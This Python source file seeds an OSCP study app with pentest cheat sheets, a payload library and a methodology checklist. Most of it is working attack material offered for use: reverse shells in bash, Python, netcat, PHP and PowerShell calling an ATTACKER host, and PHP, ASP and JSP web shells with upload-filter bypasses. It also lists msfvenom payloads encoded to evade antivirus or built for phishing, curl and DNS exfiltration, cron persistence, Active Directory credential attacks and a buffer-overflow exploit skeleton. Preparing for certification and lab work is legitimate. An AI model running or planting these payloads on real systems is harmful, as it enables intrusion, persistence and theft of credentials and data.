"""Seed cheat-sheet notes for first-run initialization.

Each entry: {title, phase, tags, content (Markdown)}.
The first time the app runs with an empty database, these are inserted so
the user immediately has working OSCP templates to build on.
"""

CHEATSHEETS = [
	{
		"title": "Reverse Shells",
		"phase": "cheatsheet",
		"tags": "shell,listener,exploit",
		"content": """# Reverse Shells

## Catch the connection
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444 # adds readline (up-arrow history)
pwncat -l 4444 # auto file grab, TTY upgrade
```

## Bash
```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

## Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## Netcat (no -e)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
```

## PHP
```php
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

## MSFVenom stageless
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o rev.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o rev.exe
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -o rev.php
```
""",
	},
	{
		"title": "Linux Privilege Escalation",
		"phase": "cheatsheet",
		"tags": "privesc,linux,enum",
		"content": """# Linux Privilege Escalation

## Quick recon
```bash
id; hostname; uname -a; cat /etc/os-release
sudo -l
cat /etc/passwd | grep -v nologin
ps aux | grep -i root
ss -tulnp
```

## SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
# Cross-check each at https://gtfobins.github.io
```

## SGID
```bash
find / -perm -2000 -type f 2>/dev/null
```

## Capabilities
```bash
getcap -r / 2>/dev/null
```

## Cron + writable scripts
```bash
cat /etc/crontab; ls -la /etc/cron.*
crontab -l
find / -writable -type f -path '/etc/cron*' 2>/dev/null
```

## Writable /etc/passwd
```bash
openssl passwd -1 -salt xyz password123
# append: hacker:$hash:0:0:hacker:/root:/bin/bash
```

## LinPEAS / LinEnum one-liners
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a # all checks, slow
```

## Kernel exploits
```bash
uname -r
searchsploit linux kernel <version>
```

## PATH hijack
```bash
# If a SUID binary calls a binary by relative name
echo '/bin/bash' > /tmp/<service>
chmod +x /tmp/<service>
export PATH=/tmp:$PATH
<run the SUID binary>
```
""",
	},
	{
		"title": "Windows Privilege Escalation",
		"phase": "cheatsheet",
		"tags": "privesc,windows,enum",
		"content": """# Windows Privilege Escalation

## Quick recon
```cmd
whoami /priv
whoami /groups
net user %username%
net localgroup administrators
systeminfo
```

## PowerUp + Watson
```powershell
Import-Module PowerUp.ps1
Invoke-AllChecks
# Watson, Sherlock, Seatbelt also useful
```

## Service misconfigs
```cmd
sc qc <service> # binpath, start type
accesschk.exe -uwcv "Everyone" * /accepteula
accesschk.exe -uwcv "BUILTIN\\Users" * /accepteula
```

## Unquoted service paths
```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v "C:\\Program Files"
# If path has spaces and no quotes, drop evil.exe in the parent
```

## AlwaysInstallElevated
```cmd
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/exec CMD='net localgroup administrators hacker /add' -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## Scheduled tasks
```cmd
schtasks /query /fo LIST /v
```

## DLL hijacking
Check service binary load order; drop malicious DLL into a writable dir on the search path.

## Token impersonation (Potato family)
If `SeImpersonatePrivilege` is enabled -> JuicyPotato, PrintSpoofer, GodPotato, SweetPotato.
```cmd
PrintSpoofer64.exe -i -c cmd
GodPotato.exe -cmd "C:\\Users\\Public\\nc.exe ATTACKER 4444 -e cmd"
```

## Credentials hunting
```cmd
cmdkey /list
dir /s /b C:\\Users\\*\\*.config C:\\Users\\*\\*.ini C:\\inetpub\\wwwroot\\web.config 2>nul
type C:\\Windows\\repair\\SAM
reg save HKLM\\SAM SAM; reg save HKLM\\SYSTEM SYSTEM
# crack with secretsdump.py or pypykatz
```
""",
	},
	{
		"title": "Active Directory",
		"phase": "ad",
		"tags": "ad,kerberos,enumeration",
		"content": """# Active Directory Cheat Sheet

## Initial enum (unauth)
```bash
nmap -p- -sV -sC TARGET -oN nmap_full.txt
crackmapexec smb TARGET --shares -u '' -p ''
nxc ldap TARGET -u '' -p '' --users
kerbrute userenum -d DOMAIN.LOCAL users.txt --dc DC01.DOMAIN.LOCAL
```

## Authenticated enum
```bash
nxc smb DC01 -u user -p 'pass' --users
nxc smb DC01 -u user -p 'pass' --groups
nxc ldap DC01 -u user -p 'pass' --bloodhound --collection All
bloodhound-python -u user -p 'pass' -d DOMAIN.LOCAL -ns DC01 -c All
```

## AS-REP Roasting (no preauth)
```bash
nxc ldap DC01 -u user -p 'pass' --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

## Kerberoasting
```bash
nxc ldap DC01 -u user -p 'pass' --kerberoasting kerb.txt
# or
GetUserSPNs.py DOMAIN.LOCAL/user:'pass' -dc-ip DC01 -request
hashcat -m 13100 kerb.txt rockyou.txt
```

## Password spray
```bash
kerbrute passwordspray -d DOMAIN.LOCAL users.txt 'Summer2026!'
```

## Lateral movement
```bash
nxc smb DC01 -u user -p 'pass' --exec-method smbexec -x 'whoami'
psexec.py DOMAIN/user:'pass'@TARGET
wmiexec.py DOMAIN/user:'pass'@TARGET
evil-winrm -i TARGET -u user -p 'pass'
```

## NTLM relay
```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
# coerce with PetitPotam, PrinterBug, DFSCoerce
PetitPotam.py -u '' -p '' ATTACKER DC01
```

## DCSync
```bash
secretsdump.py DOMAIN/admin:'pass'@DC01
# Requires Get-Changes + Get-Changes-All on the domain object
```

## Common misconfigs to grep BloodHound for
- `HasSIDHistory` on privileged users
- `GenericAll` / `GenericWrite` on GPO, OU, computer objects
- `WriteDACL` on domain object
- Paths from `Domain Users` to `Domain Admins` shorter than 4 hops
""",
	},
	{
		"title": "File Transfer to Target",
		"phase": "cheatsheet",
		"tags": "transfer,post,exfil",
		"content": """# File Transfer Techniques

## Host (attacker) -> target

### Python HTTP
```bash
python3 -m http.server 8080 --directory /tmp/tools
# target: curl/wget/iwr http://ATTACKER:8080/file
```

### SMB (impacket)
```bash
impacket-smbserver -smb2support share /tmp/tools
# Windows: copy \\\\ATTACKER\\share\\file.exe .
# Linux: smbclient //ATTACKER/share -N -c 'get file'
```

### Netcat
```bash
# receive
nc -lvnp 9001 > file.out
# send (target)
nc ATTACKER 9001 < file.in
```

### Base64 chunks (when nothing else works)
```bash
base64 -w0 file | curl -d @- http://ATTACKER:8080/up
# server side: cat > file && base64 -d > out && chmod +x out
```

### PowerShell
```powershell
Invoke-WebRequest http://ATTACKER:8080/nc.exe -OutFile nc.exe
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/nc.exe','nc.exe')
iwr http://ATTACKER:8080/rev.exe -o rev.exe
```

## Exfil from target
```bash
# target -> attacker via curl
curl -X POST -F 'f=@secret.txt' http://ATTACKER:8080/up

# DNS exfil (when egress is tight)
python3 dnsexfil.py secret.txt attacker.com
```
""",
	},
	{
		"title": "Web Enumeration",
		"phase": "enum",
		"tags": "web,scanning,directory",
		"content": """# Web Enumeration

## Directory/file brute
```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/... -mc 200,301,302,403 -t 100
dirsearch -u http://TARGET -e php,txt,html
```

## Subdomain enum
```bash
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com
assetfinder --subs-only target.com
httpx -l subs.txt -status-code -title -tech-detect
```

## Tech fingerprint
```bash
whatweb http://TARGET
wappalyzer http://TARGET
curl -I http://TARGET
```

## Virtual hosts
```bash
ffuf -u http://TARGET -H 'Host: FUZZ.target.com' -w subs.txt -fs 1234
```

## JS analysis
```bash
linkfinder.py -i http://TARGET/app.js -o links.html
python3 SecretFinder.py -i http://TARGET/app.js -o results.html
```

## Nuclei
```bash
nuclei -u http://TARGET -t cves/ -t exposures/ -t misconfiguration/
nuclei -l urls.txt -t technologies/ -o findings.txt
```

## SQLi quick checks
```bash
sqlmap -u 'http://TARGET/?id=1' --batch --level 3 --risk 2
ghauri -u 'http://TARGET/?id=1' --batch
```
""",
	},
	{
		"title": "Port Scanning & Service Enum",
		"phase": "enum",
		"tags": "nmap,scan,recon",
		"content": """# Port Scanning

## Quick wins
```bash
nmap -sC -sV -v -oN nmap/initial TARGET
rustscan -a TARGET --ulimit 5000 -- -sC -sV -oN nmap/full
masscan -p1-65535 TARGET --rate 1000
```

## Full TCP + UDP
```bash
nmap -p- --min-rate 5000 -T4 -oN nmap/alltcp TARGET
sudo nmap -sU --top-ports 100 -oN nmap/udp100 TARGET
```

## Service-specific
```bash
# SMB
nxc smb TARGET
smbclient -L //TARGET -N
crackmapexec smb TARGET --shares

# DNS
dig axfr @TARGET DOMAIN
dnsrecon -d DOMAIN -n TARGET

# SMTP
smtp-user-enum -M VRFY -U users.txt -t TARGET
nxc smtp TARGET -u '' -p '' --rcpt-to users.txt

# SNMP
onesixtyone -c /usr/share/seclists/.../snmp-onesixtyone.txt TARGET
snmpbulkwalk -v2c -c public TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects

# LDAP
ldapsearch -x -H ldap://TARGET -b 'DC=domain,DC=local'

# RPC
rpcclient -U '' -N TARGET
rpcinfo -p TARGET
```

## Web follow-ups
```bash
nikto -h http://TARGET
whatweb -a3 http://TARGET
```

## Save good scans
```bash
nmap -sV -sC -p- -oA nmap/full TARGET
grep 'open' nmap/full.gnmap | wc -l
```
""",
	},
	{
		"title": "Pivoting & Tunneling",
		"phase": "post",
		"tags": "pivot,tunnel,pivoting",
		"content": """# Pivoting & Tunneling

## SSH local forward
```bash
ssh -L 8080:internal:80 user@pivot
# browse localhost:8080 -> internal:80
```

## SSH dynamic SOCKS
```bash
ssh -D 1080 user@pivot
# proxychains curl http://internal/
```

## SSH remote forward (reverse)
```bash
ssh -R 8080:localhost:80 user@attacker
```

## chisel
```bash
# server (attacker)
./chisel server --reverse -p 8080
# client (pivot)
./chisel client ATTACKER:8080 R:socks
# then proxychains -> SOCKS5 127.0.0.1:1080
```

## ligolo-ng
```bash
# attacker - create tun, start proxy
sudo ip tuntap add user $(whoami) mode tun
./proxy -selfcert -laddr 0.0.0.0:443
# pivot
./agent -connect ATTACKER:443 -ignore-cert
# in proxy console: session -> iface -> start
```

## socat relay
```bash
socat TCP-LISTEN:3306,fork,reuseaddr TCP:internal:3306
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
```

## Port forward via meterpreter
```bash
portfwd add -l 8080 -r internal -p 80
```

## DNS over HTTPS / ICMP
- dnscat2, icmpsh
- Use only when TCP egress is fully blocked
""",
	},
	{
		"title": "Buffer Overflow Workflow",
		"phase": "exploit",
		"tags": "bof,exploit,debug",
		"content": """# Buffer Overflow (Windows, OSCP-style)

## Crash replication
```bash
# 1. generate pattern
msf-pattern_create -l 2400
# 2. paste into target app, capture EIP offset
msf-pattern_offset -q <EIP_value>
```

## Fuzzing
```bash
# python3 bof_fuzz.py
import socket, sys
buf = b"A" * int(sys.argv[1])
s = socket.socket(); s.connect((TARGET, PORT)); s.send(buf + b"\\r\\n"); s.close()
```

## Bad char analysis
```bash
msfvenom -l encoders
# send 0x00..0xff minus your null terminator, watch ESP dump
# exclude bytes that mutate before offset
```

## JMP ESP
```bash
!mona modules # find ASLR=false, /NX=false, Rebase=false
!mona find -s 'jmp esp' -m <module>
!mona jmp -r esp -m <module>
# or nasm_shell -> jmp esp -> 0xFFE4
```

## Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 EXITFUNC=thread -f c -a x86 -b '\\x00\\x0a\\x0d'
```

## Final exploit skeleton (python3)
```python
import socket, struct
host, port = 'TARGET', PORT
offset = 1978
ret = struct.pack('<I', 0x625011AF) # jmp esp, no ASLR
nops = b'\\x90' * 16
shellcode = b'...' # from msfvenom
payload = b'A'*offset + ret + nops + shellcode
s = socket.socket(); s.connect((host, port))
s.send(payload + b'\\r\\n'); s.close()
```
""",
	},
	{
		"title": "Web Shells & Stable Access",
		"phase": "post",
		"tags": "webshell,persistence",
		"content": """# Web Shells

## PHP (eval)
```php
<?php system($_GET['c']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
```

## PHP minimal POST
```php
<?php if(isset($_POST['c'])){system($_POST['c']);} ?>
```

## ASP classic
```asp
<% eval request("c") %>
```

## JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

## Upload bypass checklist
- Rename: `.php5`, `.phtml`, `.phar`, `.jpg.php`
- Magic bytes: prepend `GIF89a;` to PHP file
- Content-Type: send `image/jpeg`
- Case: `.pHp`
- Null byte (old IIS): `shell.php%00.jpg`
- Double ext: `shell.php.jpg`

## Stabilize (TTY)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then on attacker:
stty raw -echo; fg
# resize: stty rows 40 cols 160; export TERM=xterm-256color
```

## TTY-friendly shells
- `rlwrap` wrapper around nc
- `pwncat` auto-upgrade + file grab
- `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444`

## Persistence quick
- Cron: `* * * * * bash -c 'bash -i >& /dev/tcp/A/P 0>&1'`
- SSH: drop authorized_keys in user's .ssh
- Windows: schtasks /create /sc onlogon /tr ...
""",
	},
	{
		"title": "Useful One-Liners",
		"phase": "general",
		"tags": "shell,reference",
		"content": """# Useful One-Liners

## Find writable dirs/files
```bash
find / -writable -type d 2>/dev/null
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

## Find SUID/SGID
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

## Find files modified in last 5 minutes
```bash
find / -mmin -5 -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

## Wordlists
```bash
/usr/share/wordlists/ # kali default
/usr/share/seclists/ # seclists
/usr/share/dirb/wordlists/
```

## Extract everything
```bash
tar xf file.tar.gz # auto-detect
unzip file.zip
7z x file.7z
```

## Hash crack quick
```bash
hashcat -m 0 hashes.txt rockyou.txt # MD5
hashcat -m 1000 hashes.txt rockyou.txt # NTLM
hashcat -m 1800 hashes.txt rockyou.txt # sha512crypt
hashcat -m 3200 hashes.txt rockyou.txt # bcrypt
john --wordlist=rockyou.txt hashes.txt
```

## curl POST forms
```bash
curl -X POST -d 'user=admin&pass=admin' http://TARGET/login
curl -X POST -H 'Content-Type: application/json' -d '{"u":"a","p":"a"}' http://TARGET/api/login
```

## rsync over ssh
```bash
rsync -avz -e ssh user@pivot:/loot/ ./loot/
```

## OSCP report shell history
```bash
HISTFILE=~/.bash_history; cat $HISTFILE
```

## Generate stable reverse shell in Python
```python
python3 -c 'import pty;import os;os.system("bash")'
```
""",
	},
]


# Payload library seed. Inserted into the `payloads` table on first run.
# Each: {name, category, platform, content, tags}
PAYLOADS = [
	{
		"name": "Bash reverse shell",
		"category": "reverse-shell",
		"platform": "linux",
		"tags": "shell,linux,quick",
		"content": "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
	},
	{
		"name": "Python reverse shell",
		"category": "reverse-shell",
		"platform": "linux",
		"tags": "shell,python,linux",
		"content": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
	},
	{
		"name": "PHP reverse shell (fsockopen)",
		"category": "reverse-shell",
		"platform": "web",
		"tags": "shell,php,web",
		"content": "php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
	},
	{
		"name": "PHP webshell (GET)",
		"category": "webshell",
		"platform": "web",
		"tags": "php,webshell,upload",
		"content": "<?php system($_GET['c']); ?>",
	},
	{
		"name": "PHP webshell (POST)",
		"category": "webshell",
		"platform": "web",
		"tags": "php,webshell,upload",
		"content": "<?php if(isset($_POST['c'])){system($_POST['c']);} ?>",
	},
	{
		"name": "ASP classic webshell",
		"category": "webshell",
		"platform": "web",
		"tags": "asp,webshell,upload",
		"content": "<% eval request(\"c\") %>",
	},
	{
		"name": "JSP webshell",
		"category": "webshell",
		"platform": "web",
		"tags": "jsp,webshell,upload",
		"content": "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>",
	},
	{
		"name": "PowerShell reverse shell (base64)",
		"category": "reverse-shell",
		"platform": "windows",
		"tags": "shell,powershell,windows,encoded",
		"content": "powershell -e <base64 encoded payload>",
	},
	{
		"name": "msfvenom linux/x64 shell",
		"category": "msfvenom",
		"platform": "linux",
		"tags": "msfvenom,elf,linux",
		"content": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o rev.elf",
	},
	{
		"name": "msfvenom windows/x64 exe",
		"category": "msfvenom",
		"platform": "windows",
		"tags": "msfvenom,exe,windows",
		"content": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o rev.exe",
	},
	{
		"name": "msfvenom windows/x64 dll hijack",
		"category": "msfvenom",
		"platform": "windows",
		"tags": "msfvenom,dll,hijack,privesc",
		"content": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o hijack.dll",
	},
	{
		"name": "msfvenom war (Tomcat)",
		"category": "msfvenom",
		"platform": "web",
		"tags": "msfvenom,war,tomcat",
		"content": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o rev.war",
	},
	{
		"name": "msfvenom asp webshell",
		"category": "msfvenom",
		"platform": "web",
		"tags": "msfvenom,asp,webshell",
		"content": "msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER LPORT=4444 -f asp -o rev.asp",
	},
	{
		"name": "msfvenom msi (AlwaysInstallElevated)",
		"category": "msfvenom",
		"platform": "windows",
		"tags": "msfvenom,msi,privesc",
		"content": "msfvenom -p windows/x64/exec CMD='net localgroup administrators hacker /add' -f msi -o evil.msi",
	},
	{
		"name": "msfvenom hta (phish)",
		"category": "msfvenom",
		"platform": "windows",
		"tags": "msfvenom,hta,phish",
		"content": "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o evil.hta",
	},
	{
		"name": "msfvenom x86 encoded (av evade)",
		"category": "msfvenom",
		"platform": "windows",
		"tags": "msfvenom,encode,evade,av",
		"content": "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -i 5 -b '\\x00\\x0a\\x0d'",
	},
	{
		"name": "donut shellcode -> exe",
		"category": "msfvenom",
		"platform": "windows",
		"tags": "donut,shellcode,exe,evade",
		"content": "donut -f /tmp/payload.bin -o /tmp/payload.exe -e 2 -b 1 -a 2",
	},
	{
		"name": "SMB server (impacket)",
		"category": "transfer",
		"platform": "linux",
		"tags": "smb,transfer,impacket",
		"content": "impacket-smbserver -smb2support share /tmp/tools -u '' -p ''",
	},
	{
		"name": "Python HTTP server",
		"category": "transfer",
		"platform": "linux",
		"tags": "http,transfer,python",
		"content": "python3 -m http.server 8080 --directory /tmp/tools",
	},
	{
		"name": "Chisel socks",
		"category": "pivot",
		"platform": "linux",
		"tags": "chisel,pivot,socks",
		"content": "# server\n./chisel server --reverse -p 8080\n# client (pivot)\n./chisel client ATTACKER:8080 R:socks",
	},
	{
		"name": "Ligolo-ng setup",
		"category": "pivot",
		"platform": "linux",
		"tags": "ligolo,pivot,tunnel",
		"content": "# attacker\nsudo ip tuntap add user $(whoami) mode tun\n./proxy -selfcert -laddr 0.0.0.0:443\n# pivot\n./agent -connect ATTACKER:443 -ignore-cert",
	},
	{
		"name": "PrintSpoofer (SeImpersonate)",
		"category": "privesc",
		"platform": "windows",
		"tags": "privesc,potato,token",
		"content": "PrintSpoofer64.exe -i -c cmd",
	},
	{
		"name": "GodPotato (SeImpersonate)",
		"category": "privesc",
		"platform": "windows",
		"tags": "privesc,potato,token",
		"content": "GodPotato.exe -cmd \"C:\\Users\\Public\\nc.exe ATTACKER 4444 -e cmd\"",
	},
	{
		"name": "SharpHound collector",
		"category": "ad",
		"platform": "windows",
		"tags": "ad,bloodhound,enum",
		"content": "SharpHound.exe -c All --zipfilename loot.zip",
	},
	{
		"name": "bloodhound-python",
		"category": "ad",
		"platform": "linux",
		"tags": "ad,bloodhound,enum",
		"content": "bloodhound-python -u user -p 'pass' -d DOMAIN.LOCAL -ns DC01 -c All",
	},
	{
		"name": "Kerberoast (nxc)",
		"category": "ad",
		"platform": "linux",
		"tags": "ad,kerberoast,enum",
		"content": "nxc ldap DC01 -u user -p 'pass' --kerberoasting kerb.txt",
	},
	{
		"name": "AS-REP Roast (nxc)",
		"category": "ad",
		"platform": "linux",
		"tags": "ad,asreproast,enum",
		"content": "nxc ldap DC01 -u user -p 'pass' --asreproast asrep.txt",
	},
	{
		"name": "PetitPotam coerce",
		"category": "ad",
		"platform": "linux",
		"tags": "ad,coerce,ntlm",
		"content": "PetitPotam.py -u '' -p '' ATTACKER DC01",
	},
	{
		"name": "DCSync (impacket)",
		"category": "ad",
		"platform": "linux",
		"tags": "ad,dcsync,domain",
		"content": "secretsdump.py DOMAIN/admin:'pass'@DC01",
	},
	{
		"name": "nmap full TCP",
		"category": "enum",
		"platform": "linux",
		"tags": "nmap,scan,tcp",
		"content": "nmap -p- --min-rate 5000 -T4 -sV -sC -oN nmap/full TARGET",
	},
	{
		"name": "nmap vuln scan",
		"category": "enum",
		"platform": "linux",
		"tags": "nmap,vuln,scan",
		"content": "nmap --script vuln -p <ports> TARGET -oN nmap/vuln",
	},
	{
		"name": "gobuster dir brute",
		"category": "enum",
		"platform": "web",
		"tags": "web,gobuster,dir",
		"content": "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50",
	},
	{
		"name": "feroxbuster dir brute",
		"category": "enum",
		"platform": "web",
		"tags": "web,feroxbuster,dir",
		"content": "feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3",
	},
	{
		"name": "LinPEAS one-liner",
		"category": "enum",
		"platform": "linux",
		"tags": "linpeas,privesc,enum",
		"content": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
	},
	{
		"name": "PowerUp.ps1",
		"category": "enum",
		"platform": "windows",
		"tags": "powerup,privesc,enum",
		"content": "Import-Module PowerUp.ps1; Invoke-AllChecks",
	},
]


# Default methodology checklist, seeded per new machine.
# Each phase has items the user ticks off.
METHODOLOGY = {
	"enum": [
		"nmap full TCP scan",
		"Service version detection (-sV -sC)",
		"UDP top 100 ports",
		"Web vhost / directory brute",
		"Web technology fingerprint (whatweb)",
		"SMB / NFS / FTP anonymous check",
		"SNMP / DNS zone transfer",
	],
	"exploit": [
		"Initial foothold identified",
		"Exploit working in lab / documented",
		"Shell as low-priv user",
		"Screenshot of foothold shell",
	],
	"privesc": [
		"LinPEAS / WinPEAS run",
		"Sudo / SUID / services checked",
		"Token privileges reviewed",
		"Privesc vector identified",
		"Root / SYSTEM shell obtained",
		"Screenshot of root shell",
	],
	"post": [
		"user.txt captured",
		"root.txt / proof.txt captured",
		"Passwords / hashes harvested",
		"Lovely flags saved to /loot",
		"Methodology notes cleaned for report",
	],
}
